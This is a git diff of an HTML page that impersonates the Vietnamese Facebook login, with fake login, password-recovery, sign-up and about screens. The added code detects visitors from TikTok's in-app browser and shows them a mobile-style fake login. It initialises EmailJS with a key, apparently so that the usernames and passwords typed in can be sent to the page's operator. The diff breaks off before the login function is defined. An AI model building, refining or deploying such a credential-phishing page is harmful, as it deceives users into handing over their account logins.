@@ -22,6 +22,133 @@
             min-height: 100vh;
             background: #f0f2f5;
         }
+        /* TikTok Mode Styles */
+        body.tiktok-mode {
+            background: #fff;
+            justify-content: center;
+            align-items: center;
+        }
+        .header {
+            width: 100%;
+            padding: 10px 15px;
+            background-color: #f5f6f5;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+            display: none;
+        }
+        body.tiktok-mode .header {
+            display: block;
+        }
+        .header.hidden {
+            display: none !important;
+        }
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .header-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #1c1e21;
+            text-align: center;
+            flex: 1;
+        }
+        .header-title.small-title {
+            font-size: 14px;
+        }
+        .header-menu {
+            cursor: pointer;
+            position: absolute;
+            right: 0;
+        }
+        .header-menu svg {
+            width: 24px;
+            height: 24px;
+        }
+        .dropdown-menu {
+            display: none;
+            position: absolute;
+            top: 40px;
+            right: 0;
+            background-color: #fff;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+            z-index: 1001;
+            width: 200px;
+        }
+        .dropdown-menu.active {
+            display: block;
+        }
+        .dropdown-item {
+            display: flex;
+            align-items: center;
+            padding: 10px 15px;
+            font-size: 14px;
+            color: #000;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+            cursor: pointer;
+        }
+        .dropdown-item:last-child {
+            border-bottom: none;
+        }
+        .dropdown-item:hover {
+            background-color: #f0f0f0;
+        }
+        .dropdown-item svg {
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+        }
+        .language-border {
+            border-bottom: 1px solid #ddd;
+            margin-top: 5px;
+            margin-bottom: 5px;
+            max-width: 400px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .language-text {
+            font-size: 12px;
+            color: #737373;
+            text-align: center;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .back-button-header {
+            display: none;
+            align-items: center;
+            justify-content: flex-start;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+            max-width: 400px;
+            margin-left: auto;
+            margin-right: auto;
+            color: #1c1e21;
+        }
+        .back-button-header svg {
+            margin-right: 8px;
+        }
+        .gradient-section {
+            position: fixed;
+            top: 70px;
+            left: 0;
+            width: 100%;
+            height: 50%;
+            background: linear-gradient(to bottom, #e6f0fa 0%, #f5f6f5 100%);
+            z-index: 0;
+            display: none;
+        }
+        body.tiktok-mode .gradient-section {
+            display: block;
+        }
         .main-container {
             flex-grow: 1;
             padding: 20px;
@@ -33,42 +160,226 @@
             justify-content: center;
             align-items: center;
         }
-        .header-container {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 20px;
-        }
-        .header-container.hidden {
+        .login-container-tiktok, .login-container-desktop,
+        .forgot-password-container, .forgot-password-email-container, .create-account-container,
+        .about-container, .help-container, .more-container {
+            width: 100%;
+            max-width: 400px;
+            background: transparent;
+            padding: 20px;
+            margin-top: 100px;
+            text-align: left;
+            position: relative;
+            z-index: 1;
             display: none;
         }
+        .login-container-tiktok.active, .login-container-desktop.active,
+        .forgot-password-container.active, .forgot-password-email-container.active, 
+        .create-account-container.active, .about-container.active, 
+        .help-container.active, .more-container.active {
+            display: block;
+        }
+        body.tiktok-mode .login-container-tiktok.active {
+            text-align: center;
+        }
         .facebook-logo {
-            width: 40px;
-            height: 40px;
-            margin-right: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 40px 0;
         }
-        .facebook-title {
-            font-size: 24px;
-            font-weight: bold;
-            color: #1877F2;
-            margin-right: 10px;
+        .facebook-logo img {
+            width: 60px;
+            height: 60px;
         }
-        .open-button {
-            background-color: #42B72A;
-            color: white;
-            border: none;
+        .login-container-tiktok input, .login-container-desktop input,
+        .forgot-password-container input, .forgot-password-email-container input, 
+        .create-account-container input {
+            margin-bottom: 15px;
             border-radius: 6px;
-            padding: 8px 16px;
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            background: #fff;
+        }
+        .btn-primary {
+            width: 100%;
+            border-radius: 6px;
+            padding: 12px;
+            background-color: #1877f2;
+            border-color: #1877f2;
+            color: white;
             font-weight: bold;
+        }
+        .btn-create-account {
+            background: transparent;
+            color: #1877f2;
+            border: 1px solid #1877f2;
+            border-radius: 6px;
+            width: 100%;
+            padding: 12px;
+            font-weight: bold;
+        }
+        .forgot-password {
+            margin-top: 15px;
+            color: #1877f2;
+            cursor: pointer;
+            font-size: 14px;
+            text-align: center;
+            display: block;
+        }
+        .bottom-section {
+            position: fixed;
+            bottom: 30px;
+            width: 100%;
+            max-width: 400px;
+            left: 50%;
+            transform: translateX(-50%);
+            text-align: center;
+            z-index: 1;
+            display: none;
+        }
+        body.tiktok-mode .bottom-section {
+            display: block;
+        }
+        .meta-section {
+            color: #737373;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        .meta-section::before {
+            content: "∞ ";
+            font-size: 20px;
+            color: #737373;
+        }
+        .footer-links-tiktok {
+            position: fixed;
+            bottom: 0px;
+            width: 100%;
+            max-width: 400px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 12px;
+            color: #737373;
+            text-align: center;
+            display: none;
+            justify-content: center;
+            gap: 20px;
+            z-index: 1;
+        }
+        body.tiktok-mode .footer-links-tiktok {
+            display: flex;
+        }
+        .footer-links-tiktok span {
+            color: #737373;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .footer-links-tiktok span:hover {
+            text-decoration: underline;
+        }
+        .info-text {
+            font-size: 12px;
+            color: #737373;
+            margin-top: 10px;
+        }
+        .search-by-email, .search-by-phone {
+            display: block;
+            text-align: center;
+            margin-top: 15px;
+            padding: 10px;
+            background: transparent;
+            color: #737373;
+            border: 1px solid #ddd;
+            border-radius: 6px;
             font-size: 14px;
             cursor: pointer;
         }
-        .language-text {
-            font-size: 12px;
-            color: #737373;
-            margin-top: 5px;
+        .error-message {
+            color: #dc3545;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+        .success-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+            width: 90%;
+            max-width: 300px;
+            text-align: center;
+            padding: 20px;
+            z-index: 10002;
+        }
+        .success-popup-title {
+            font-size: 16px;
+            font-weight: bold;
+            color: #1c1e21;
+            margin-bottom: 10px;
+        }
+        .success-popup-message {
+            font-size: 14px;
+            color: #4b4f56;
             margin-bottom: 20px;
         }
+        .success-popup-button {
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            padding: 10px;
+            width: 100px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .success-popup-button:hover {
+            background-color: #165db2;
+        }
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            z-index: 10001;
+        }
+        .fb-section {
+            margin-bottom: 20px;
+        }
+        .fb-section h2 {
+            font-size: 24px;
+            font-weight: bold;
+            color: #1c1e21;
+            margin-bottom: 10px;
+        }
+        .fb-section p {
+            font-size: 14px;
+            color: #4b4f56;
+            line-height: 1.4;
+        }
+        .fb-section a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .fb-section a:hover {
+            text-decoration: underline;
+        }
+        .fb-links {
+            margin-top: 15px;
+        }
+        .fb-links a {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        /* Desktop Mode Styles */
         .left-section {
             display: none;
             text-align: left;
@@ -83,156 +394,41 @@
             color: #1c1e21;
             line-height: 1.2;
         }
-        .back-button {
-            display: none;
+        body.desktop-mode .main-container {
+            display: flex;
+            justify-content: center;
             align-items: center;
-            justify-content: flex-start;
-            cursor: pointer;
-            font-size: 14px;
-            margin-bottom: 20px;
-            color: #1c1e21;
-            position: absolute;
-            top: 20px;
-            left: 20px;
+            padding: 40px;
+            max-width: 1200px;
         }
-        .back-button svg {
-            margin-right: 8px;
+        body.desktop-mode .left-section {
+            display: block;
+            flex: 1;
+            max-width: 500px;
         }
-        .login-container-tiktok, .login-container-desktop,
-        .forgot-password-container, .forgot-password-email-container, .create-account-container {
+        body.desktop-mode .login-container-desktop {
+            flex: 1;
+            max-width: 400px;
+            margin-left: 40px;
             background: #fff;
-            padding: 15px;
+            padding: 20px;
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            display: none;
-            margin: 0 auto;
-            max-width: 400px;
-            width: 100%;
-        }
-        .login-container-tiktok.active, .login-container-desktop.active,
-        .forgot-password-container.active, .forgot-password-email-container.active, 
-        .create-account-container.active {
-            display: block;
-        }
-        .tiktok-logo {
-            width: 40px;
-            height: 40px;
-            margin-bottom: 20px;
-        }
-        input.form-control {
-            margin-bottom: 10px;
-            border-radius: 6px;
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            background: #fff;
-            font-size: 14px;
-        }
-        .btn-primary {
-            width: 100%;
-            border-radius: 6px;
-            padding: 12px;
-            background-color: #1877F2;
-            border-color: #1877F2;
-            color: white;
-            font-weight: bold;
-            font-size: 14px;
-            margin-bottom: 10px;
-            cursor: pointer;
-        }
-        .btn-create-account {
-            background-color: #42B72A;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: 12px 20px;
-            font-weight: bold;
-            font-size: 14px;
-            display: inline-block;
-            margin-top: 10px;
-            cursor: pointer;
-        }
-        .forgot-password {
-            margin-top: 10px;
-            color: #1877F2;
-            cursor: pointer;
-            font-size: 12px;
         }
         .divider {
             border-top: 1px solid #ddd;
             margin: 15px 0;
         }
-        .info-text {
-            font-size: 10px;
-            color: #737373;
-            margin-top: 10px;
-        }
-        .search-by-email, .search-by-phone {
-            display: block;
-            text-align: center;
-            margin-top: 10px;
-            padding: 8px;
-            background: transparent;
-            color: #737373;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            font-size: 12px;
-            cursor: pointer;
-            text-decoration: none;
-        }
-        .success-popup {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: #fff;
-            border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
-            width: 90%;
-            max-width: 300px;
-            text-align: center;
-            padding: 15px;
-            z-index: 10002;
-        }
-        .success-popup-title {
-            font-size: 16px;
-            font-weight: bold;
-            color: #1c1e21;
-            margin-bottom: 8px;
-        }
-        .success-popup-message {
-            font-size: 12px;
-            color: #4b4f56;
-            margin-bottom: 15px;
-        }
-        .success-popup-button {
-            background-color: #1877f2;
-            color: #fff;
-            border: none;
-            border-radius: 6px;
-            padding: 10px;
-            width: 100px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        .overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.3);
-            z-index: 10001;
-        }
         .footer {
             background: #f5f6f5;
             padding: 15px 0;
-            font-size: 10px;
+            font-size: 12px;
             color: #737373;
             text-align: center;
+            display: none;
+        }
+        body.desktop-mode .footer {
+            display: block;
         }
         .footer-languages {
             margin: 0 auto 8px;
@@ -262,98 +458,109 @@
             margin: 0 auto;
             color: #737373;
         }
-        body.tiktok-mode {
-            background: linear-gradient(to bottom, #E6F0FA, #FFFFFF);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-        }
-        body.tiktok-mode .main-container {
-            padding: 15px;
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        body.tiktok-mode .footer {
-            background: transparent;
-        }
-        body.desktop-mode .main-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 40px;
-            max-width: 1200px;
-        }
-        body.desktop-mode .left-section {
-            display: block;
-            flex: 1;
-            max-width: 500px;
-        }
-        body.desktop-mode .login-container-desktop {
-            flex: 1;
-            max-width: 400px;
-            margin-left: 40px;
-        }
         @media (max-width: 576px) {
-            .main-container {
-                padding: 15px;
+            .header { padding: 8px 10px; }
+            .header-title { font-size: 16px; }
+            .header-title.small-title { font-size: 12px; }
+            .language-text { font-size: 11px; }
+            .back-button-header { font-size: 14px; }
+            .facebook-logo img { width: 50px; height: 50px; }
+            .login-container-tiktok, .forgot-password-container, .forgot-password-email-container, 
+            .create-account-container, .about-container, .help-container, .more-container { 
+                padding: 15px; margin-top: 80px; 
             }
-            .back-button {
-                top: 10px;
-                left: 10px;
-            }
-            .login-container-tiktok {
-                width: 90%;
-                max-width: 350px;
-            }
+            .facebook-logo { margin: 30px 0; }
+            .btn-primary, .btn-create-account { padding: 10px; }
+            .footer-links-tiktok { gap: 15px; }
+            .bottom-section { bottom: 25px; }
+            .gradient-section { top: 60px; height: 40%; }
+            .fb-section h2 { font-size: 20px; }
         }
     </style>
 </head>
 <body>
-    <div class="main-container">
-        <div class="header-container">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo">
-            <div class="facebook-title">Facebook</div>
-            <button class="open-button" onclick="showLogin()">Mở</button>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("wF5gWgp1GWyg7q0KY");
+        })();
+    </script>
+
+    <div class="header">
+        <div class="header-content">
+            <div class="header-title" id="header-title">Đăng nhập Facebook | Facebook</div>
+            <div class="header-menu" onclick="toggleDropdown()">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="12" cy="6" r="2" fill="#1c1e21"/>
+                    <circle cx="12" cy="12" r="2" fill="#1c1e21"/>
+                    <circle cx="12" cy="18" r="2" fill="#1c1e21"/>
+                </svg>
+            </div>
+            <div class="dropdown-menu" id="dropdownMenu">
+                <div class="dropdown-item" onclick="alert('Báo cáo đã được gửi!')">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V15H13V17ZM13 13H11V7H13V13Z" fill="#737373"/>
+                    </svg>
+                    Báo cáo
+                </div>
+                <div class="dropdown-item" onclick="window.open(window.location.href, '_blank')">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M19 19H5V5H12V3H5C3.9 3 3 3.9 3 5V19C3 20.1 3.9 21 5 21H19C20.1 21 21 20.1 21 19V12H19V19ZM14 3V5H17.59L7.76 14.83L9.17 16.24L19 6.41V10H21V3H14Z" fill="#737373"/>
+                    </svg>
+                    Mở trong trình duyệt
+                </div>
+                <div class="dropdown-item" onclick="navigator.clipboard.writeText(window.location.href).then(() => alert('Liên kết đã được sao chép!'))">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M16 1H4C2.9 1 2 1.9 2 3V17H4V3H16V1ZM19 5H8C6.9 5 6 5.9 6 7V21C6 22.1 6.9 23 8 23H19C20.1 23 21 22.1 21 21V7C21 5.9 20.1 5 19 5ZM19 21H8V7H19V21Z" fill="#737373"/>
+                    </svg>
+                    Sao chép liên kết
+                </div>
+            </div>
         </div>
-        <div class="language-text">Tiếng Việt</div>
-        <div class="left-section">
-            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo" class="desktop-logo">
-            <div class="slogan">Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</div>
-        </div>
-        <div class="back-button" id="back-button" onclick="goBack()">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <div class="language-border"></div>
+        <div class="language-text" id="language-text">Tiếng Việt</div>
+        <div class="back-button-header" id="back-button-header" onclick="showLogin()">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <path d="M15 18L9 12L15 6" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
             </svg>
             Quay lại
         </div>
+    </div>
+    <div class="gradient-section"></div>
+    <div class="main-container">
+        <div class="left-section">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo" class="desktop-logo">
+            <div class="slogan">Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</div>
+        </div>
         <!-- TikTok Login Container -->
         <div class="login-container-tiktok">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7c/Facebook_New_Logo_%282015%29.svg/1200px-Facebook_New_Logo_%282015%29.svg.png" alt="Facebook Logo" class="tiktok-logo">
+            <div class="facebook-logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+            </div>
             <input type="text" id="login-input-tiktok" class="form-control" placeholder="Số di động hoặc email">
             <input type="password" id="password-tiktok" class="form-control" placeholder="Mật khẩu">
             <button class="btn btn-primary" onclick="login('tiktok')">Đăng nhập</button>
-            <div class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu?</div>
-            <button class="btn btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
+            <p class="text-danger mt-2" id="error-message-tiktok" style="display:none;">Sai tên đăng nhập hoặc mật khẩu</p>
+            <div class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu ư?</div>
+            <button class="btn btn-create-account mt-2" onclick="showCreateAccount()">Tạo tài khoản mới</button>
         </div>
         <!-- Desktop Login Container -->
         <div class="login-container-desktop">
             <input type="text" id="login-input-desktop" class="form-control" placeholder="Số di động hoặc email">
             <input type="password" id="password-desktop" class="form-control" placeholder="Mật khẩu">
             <button class="btn btn-primary" onclick="login('desktop')">Đăng nhập</button>
-            <div class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu?</div>
+            <p class="text-danger mt-2" id="error-message-desktop" style="display:none;">Sai tên đăng nhập hoặc mật khẩu</p>
+            <div class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu ư?</div>
             <div class="divider"></div>
-            <button class="btn btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
+            <button class="btn btn-create-account mt-2" onclick="showCreateAccount()">Tạo tài khoản mới</button>
         </div>
         <!-- Forgot Password Container -->
         <div class="forgot-password-container">
             <h5 style="font-weight: bold;">Tìm tài khoản của bạn</h5>
             <p>Nhập số di động của bạn</p>
             <input type="text" id="phone-input" class="form-control" placeholder="Số di động">
-            <p class="info-text">Chúng tôi có thể gửi thông báo qua SMS và WhatsApp nhằm mục đích bảo mật</p>
+            <p class="info-text">Chúng tôi có thể gửi cho bạn thông báo qua SMS và WhatsApp nhằm mục đích bảo mật và đăng nhập</p>
             <button class="btn btn-primary" onclick="searchByPhone()">Tiếp tục</button>
+            <p class="error-message" id="phone-error-message">Không tìm thấy tài khoản. Vui lòng thử lại với email.</p>
             <a href="#" class="search-by-email" onclick="showForgotPasswordEmail()">Tìm kiếm bằng email</a>
         </div>
         <!-- Forgot Password Email Container -->
@@ -362,6 +569,7 @@
             <p>Nhập email của bạn</p>
             <input type="email" id="email-input" class="form-control" placeholder="Email">
             <button class="btn btn-primary" onclick="searchByEmail()">Tiếp tục</button>
+            <p class="error-message" id="email-error-message">Không tìm thấy tài khoản. Vui lòng thử lại!</p>
             <a href="#" class="search-by-phone" onclick="showForgotPassword()">Tìm kiếm bằng số di động</a>
         </div>
         <!-- Create Account Container -->
@@ -374,6 +582,63 @@
             <input type="password" id="new-password" class="form-control" placeholder="Mật khẩu mới">
             <input type="password" id="confirm-password" class="form-control" placeholder="Xác nhận mật khẩu">
             <button class="btn btn-primary" onclick="createAccount()">Đăng ký</button>
+            <p class="error-message" id="create-account-error-message">Vui lòng điền đầy đủ thông tin!</p>
+        </div>
+        <!-- About Container -->
+        <div class="about-container">
+            <div class="fb-section">
+                <h2>Giới thiệu về Facebook</h2>
+                <p>Chúng tôi tin rằng mọi người có thể làm được nhiều điều hơn khi ở bên nhau. Sứ mệnh của chúng tôi là mang đến cho bạn sức mạnh để xây dựng cộng đồng và đưa thế giới đến gần nhau hơn.</p>
+            </div>
+            <div class="fb-section">
+                <h2>Công ty</h2>
+                <p>Facebook là một phần của Meta, tập trung vào việc kết nối con người thông qua công nghệ. Thành lập năm 2004 bởi Mark Zuckerberg.</p>
+                <div class="fb-links">
+                    <a href="#">Tìm hiểu thêm về Meta</a>
+                    <a href="#">Sự nghiệp tại Facebook</a>
+                    <a href="#">Lịch sử của chúng tôi</a>
+                </div>
+            </div>
+        </div>
+        <!-- Help Container -->
+        <div class="help-container">
+            <div class="fb-section">
+                <h2>Trợ giúp & Hỗ trợ</h2>
+                <p>Bạn cần trợ giúp? Chúng tôi ở đây để hỗ trợ bạn với bất kỳ vấn đề nào liên quan đến tài khoản, bảo mật, hoặc cách sử dụng Facebook.</p>
+            </div>
+            <div class="fb-section">
+                <h2>Các chủ đề phổ biến</h2>
+                <div class="fb-links">
+                    <a href="#">Quên mật khẩu</a>
+                    <a href="#">Bảo mật tài khoản</a>
+                    <a href="#">Báo cáo nội dung</a>
+                    <a href="#">Liên hệ với chúng tôi</a>
+                </div>
+            </div>
+        </div>
+        <!-- More Container -->
+        <div class="more-container">
+            <div class="fb-section">
+                <h2>Xem thêm</h2>
+                <p>Khám phá các sản phẩm, tính năng và dịch vụ khác từ Facebook và Meta.</p>
+            </div>
+            <div class="fb-section">
+                <h2>Sản phẩm</h2>
+                <div class="fb-links">
+                    <a href="#">Instagram</a>
+                    <a href="#">Messenger</a>
+                    <a href="#">WhatsApp</a>
+                    <a href="#">Oculus</a>
+                </div>
+            </div>
+            <div class="fb-section">
+                <h2>Tính năng</h2>
+                <div class="fb-links">
+                    <a href="#">Stories</a>
+                    <a href="#">Groups</a>
+                    <a href="#">Marketplace</a>
+                </div>
+            </div>
         </div>
     </div>
     <div class="overlay" id="dialog-overlay"></div>
@@ -381,6 +646,14 @@
         <div class="success-popup-title" id="dialog-title"></div>
         <div class="success-popup-message" id="dialog-message"></div>
         <button class="success-popup-button" onclick="hideDialog()">OK</button>
+    </div>
+    <div class="bottom-section">
+        <div class="meta-section">Meta</div>
+    </div>
+    <div class="footer-links-tiktok">
+        <span onclick="showAbout()">Giới thiệu</span>
+        <span onclick="showHelp()">Trợ giúp</span>
+        <span onclick="showMore()">Xem thêm</span>
     </div>
     <footer class="footer">
         <div class="footer-languages">
@@ -421,18 +694,7 @@
             <a href="https://www.facebook.com/policies/" target="_blank">Điều khoản</a>
         </div>
         <div class="footer-meta">Meta © 2025</div>
-        <div class="footer-links-simple" style="display: none;">
-            <a href="https://about.meta.com/" target="_blank">Giới thiệu</a>
-            <a href="https://www.facebook.com/help/" target="_blank">Trợ giúp</a>
-            <a href="#" target="_blank">Xem thêm</a>
-        </div>
     </footer>
-
-    <script type="text/javascript">
-        (function() {
-            emailjs.init("wF5gWgp1GWyg7q0KY"); // Thay bằng publicKey của bạn nếu khác
-        })();
-    </script>
 
     <script>
         window.onload = function() {
@@ -443,7 +705,12 @@
             const isFromTikTok = 
                 referrer.includes("tiktok.com") || 
                 userAgent.includes("tiktok") || 
+                userAgent.includes("bytedance") || 
+                userAgent.includes("musical_ly") || 
+                userAgent.includes("douyin") || 
+                urlParams.has("tt_from") || 
                 urlParams.get("utm_source") === "tiktok" || 
+                urlParams.get("source_app") === "tiktok" || 
                 /mobile|android|iphone|ipad/i.test(userAgent);
 
             console.log("Referrer:", referrer);
@@ -457,32 +724,28 @@
             if (isFromTikTok && !isDesktop) {
                 console.log("Applying TikTok mode");
                 document.body.classList.add('tiktok-mode');
-                document.querySelector('.header-container').classList.add('hidden');
-                document.querySelector('.left-section').style.display = 'none';
-                document.querySelector('.language-text').style.display = 'none';
+                document.querySelector('.header').classList.remove('hidden');
+                document.querySelector('.login-container-tiktok').style.marginTop = '20px';
                 hideAllExcept('.login-container-tiktok');
-                // Sửa footer cho TikTok mode
-                document.querySelector('.footer-languages').style.display = 'none';
-                document.querySelector('.footer-links').style.display = 'none';
-                document.querySelector('.footer-links-simple').style.display = 'block';
             } else {
                 console.log("Applying Desktop mode");
                 document.body.classList.add('desktop-mode');
-                document.querySelector('.header-container').classList.add('hidden');
+                document.querySelector('.header').classList.add('hidden');
                 document.querySelector('.left-section').style.display = 'block';
-                document.querySelector('.language-text').style.display = 'none';
                 hideAllExcept('.login-container-desktop');
-                // Giữ footer đầy đủ cho Desktop mode
-                document.querySelector('.footer-languages').style.display = 'block';
-                document.querySelector('.footer-links').style.display = 'block';
-                document.querySelector('.footer-links-simple').style.display = 'none';
             }
         };
+
+        function toggleDropdown() {
+            const dropdownMenu = document.getElementById('dropdownMenu');
+            dropdownMenu.classList.toggle('active');
+        }
 
         function hideAllExcept(selector) {
             const containers = [
                 '.login-container-tiktok', '.login-container-desktop',
-                '.forgot-password-container', '.forgot-password-email-container', '.create-account-container'
+                '.forgot-password-container', '.forgot-password-email-container', 
+                '.create-account-container', '.about-container', '.help-container', '.more-container'
             ];
             containers.forEach(container => {
                 const element = document.querySelector(container);
@@ -492,94 +755,96 @@
             document.querySelector(selector).classList.add('active');
         }
 
-        let previousPage = null;
-
         function showLogin() {
             const isDesktop = document.body.classList.contains('desktop-mode');
             const isTikTok = document.body.classList.contains('tiktok-mode');
             if (isTikTok) {
                 hideAllExcept('.login-container-tiktok');
-                document.querySelector('.header-container').classList.add('hidden');
-                document.querySelector('.language-text').style.display = 'none';
-                document.querySelector('.footer-languages').style.display = 'none';
-                document.querySelector('.footer-links').style.display = 'none';
-                document.querySelector('.footer-links-simple').style.display = 'block';
+                document.getElementById('header-title').innerText = 'Đăng nhập Facebook | Facebook';
+                document.getElementById('header-title').classList.remove('small-title');
+                document.getElementById('language-text').style.display = 'block';
+                document.getElementById('back-button-header').style.display = 'none';
             } else if (isDesktop) {
                 hideAllExcept('.login-container-desktop');
-                document.querySelector('.header-container').classList.add('hidden');
-                document.querySelector('.language-text').style.display = 'none';
-                document.querySelector('.footer-languages').style.display = 'block';
-                document.querySelector('.footer-links').style.display = 'block';
-                document.querySelector('.footer-links-simple').style.display = 'none';
+                document.querySelector('.left-section').style.display = 'block';
             }
-            document.getElementById('back-button').style.display = 'none';
-            document.querySelector('.left-section').style.display = isDesktop ? 'block' : 'none';
-            previousPage = null;
         }
 
         function showForgotPassword() {
             const isDesktop = document.body.classList.contains('desktop-mode');
             hideAllExcept('.forgot-password-container');
-            document.getElementById('back-button').style.display = 'flex';
-            document.querySelector('.left-section').style.display = 'none';
-            document.querySelector('.language-text').style.display = 'none';
             if (isDesktop) {
-                document.querySelector('.header-container').classList.add('hidden');
-                document.querySelector('.footer-languages').style.display = 'block';
-                document.querySelector('.footer-links').style.display = 'block';
-                document.querySelector('.footer-links-simple').style.display = 'none';
+                document.querySelector('.left-section').style.display = 'none';
             } else {
-                document.querySelector('.header-container').classList.add('hidden');
-                document.querySelector('.footer-languages').style.display = 'none';
-                document.querySelector('.footer-links').style.display = 'none';
-                document.querySelector('.footer-links-simple').style.display = 'block';
+                document.getElementById('header-title').innerText = 'Tìm tài khoản của bạn';
+                document.getElementById('header-title').classList.add('small-title');
+                document.getElementById('language-text').style.display = 'none';
+                document.getElementById('back-button-header').style.display = 'flex';
             }
-            previousPage = showLogin;
         }
 
         function showForgotPasswordEmail() {
             const isDesktop = document.body.classList.contains('desktop-mode');
             hideAllExcept('.forgot-password-email-container');
-            document.getElementById('back-button').style.display = 'flex';
-            document.querySelector('.left-section').style.display = 'none';
-            document.querySelector('.language-text').style.display = 'none';
             if (isDesktop) {
-                document.querySelector('.header-container').classList.add('hidden');
-                document.querySelector('.footer-languages').style.display = 'block';
-                document.querySelector('.footer-links').style.display = 'block';
-                document.querySelector('.footer-links-simple').style.display = 'none';
+                document.querySelector('.left-section').style.display = 'none';
             } else {
-                document.querySelector('.header-container').classList.add('hidden');
-                document.querySelector('.footer-languages').style.display = 'none';
-                document.querySelector('.footer-links').style.display = 'none';
-                document.querySelector('.footer-links-simple').style.display = 'block';
+                document.getElementById('header-title').innerText = 'Tìm tài khoản của bạn';
+                document.getElementById('header-title').classList.add('small-title');
+                document.getElementById('language-text').style.display = 'none';
+                document.getElementById('back-button-header').style.display = 'flex';
             }
-            previousPage = showForgotPassword;
         }
 
         function showCreateAccount() {
             const isDesktop = document.body.classList.contains('desktop-mode');
             hideAllExcept('.create-account-container');
-            document.getElementById('back-button').style.display = 'flex';
-            document.querySelector('.left-section').style.display = 'none';
-            document.querySelector('.language-text').style.display = 'none';
             if (isDesktop) {
-                document.querySelector('.header-container').classList.add('hidden');
-                document.querySelector('.footer-languages').style.display = 'block';
-                document.querySelector('.footer-links').style.display = 'block';
-                document.querySelector('.footer-links-simple').style.display = 'none';
+                document.querySelector('.left-section').style.display = 'none';
             } else {
-                document.querySelector('.header-container').classList.add('hidden');
-                document.querySelector('.footer-languages').style.display = 'none';
-                document.querySelector('.footer-links').style.display = 'none';
-                document.querySelector('.footer-links-simple').style.display = 'block';
+                document.getElementById('header-title').innerText = 'Tạo tài khoản mới';
+                document.getElementById('header-title').classList.add('small-title');
+                document.getElementById('language-text').style.display = 'none';
+                document.getElementById('back-button-header').style.display = 'flex';
             }
-            previousPage = showLogin;
         }
 
-        function goBack() {
-            if (previousPage) {
-                previousPage();
+        function showAbout() {
